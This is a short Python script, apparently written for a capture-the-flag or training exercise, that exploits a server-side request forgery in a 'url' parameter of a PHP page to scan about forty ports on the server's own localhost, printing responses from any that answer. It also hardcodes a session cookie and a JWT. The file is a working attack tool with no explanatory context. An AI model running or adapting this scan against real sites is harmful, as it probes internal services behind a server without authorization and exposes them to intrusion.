import requests

cookies={"X-SESSION-COOKIE":"68a58cd970b1eace4cc0a7e533c964ee31629d36f03a681baa28a9b3c87ffaf4.9d3ebc6470ca63130d141d4ee44fc4e4193753faefc9dd9ed65d12bcfa1f3e50", "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYm9ibyIsImlhdCI6MTc3NTU4ODgzMSwiZXhwIjoxNzc1NTkyNDMxfQ.In1DG4i3BkLm4I0lZf8qXnZ9Mux6keiefRkJ0vRT1sg"}
url="http://algolymp.learn-it.org:30020/index.php"

ports=[21, 22, 23, 25, 37, 53, 67, 68, 69, 79,  
80, 101, 110, 111, 119, 135, 137, 138, 139, 143,  
161, 179, 389, 443, 445, 465, 514, 543, 587, 993,  
1080, 1433, 1521, 1543, 1921, 2049, 3306, 3389, 8080, 9091]
for i in ports:
    res=requests.get(url+f"?url=http%3A%2F%2Flocalhost%3A{i}",cookies=cookies)
    if "Request failed" in res.text:continue
    print(str(i)+":")
    print(res.text)